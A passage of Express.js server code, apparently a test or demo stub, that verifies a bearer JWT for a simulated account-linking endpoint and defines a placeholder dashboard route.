    const authHeader = req.headers.authorization;
    if (!authHeader) {
      return res.status(401).json({ error: 'Authorization required' });
    }

    try {
      const token = authHeader.split(' ')[1];
      const payload = ssoService.jwtProvider.verifyToken(token);

      // Simulate account linking
      res.json({ message: 'Account linked successfully' });
    } catch (error) {
      res.status(401).json({ error: 'Invalid token' });
    }
  });

  // Dashboard
  app.get('/dashboard', (req, res) => {
    res.json({ message: 'Welcome to dashboard' });
  });
}
